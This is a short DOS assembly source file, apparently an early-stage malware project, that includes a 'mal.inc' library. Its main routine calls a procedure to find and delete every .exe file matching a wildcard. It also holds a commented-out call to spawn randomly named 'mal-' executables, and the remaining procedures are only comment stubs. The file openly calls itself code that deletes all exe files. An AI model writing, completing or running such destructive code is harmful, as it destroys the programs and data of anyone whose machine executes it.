;This code deletes all exe files for now
INCLUDE mal.inc

.data
	;Delete part
	DTA BYTE 128 DUP(0)		;Disk Transfer Address
	delete_files BYTE "*.exe",0		;* is wildcard for any number of characters, used by 4Eh(find first file) and 4Fh(find next file)
	;Random creator part
	random_file BYTE "mal-",3 DUP(?), ".exe",0
	random_file_size = ($-random_file)
	
.code

	main PROC
		
		mov ax, @data
		mov ds, ax
	
		INVOKE clrscr
	
		INVOKE search_exe_files_and_delete, ADDR DTA, ADDR delete_files
		
		;INVOKE generate_random_exe_files, random_file, random_file_size, ADDR random_file
	
		exit
	main ENDP
	;---------------------------------------------------------------------------------------------------
	;search_and_delete_exe PROC
	;------------------------------------------------------
	;delete_file PROC
	;----------------------------------------------------------------------------------------------------
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Functions for random part
	;----------------------------------------------------------------------------------------------------
	;generate_random_exe_files PROC
	;--------------------------------------------------------------------------------------------------
	;create_file PROC
	;--------------------------------------------------------------------------------------------------
	;close_file PROC
END main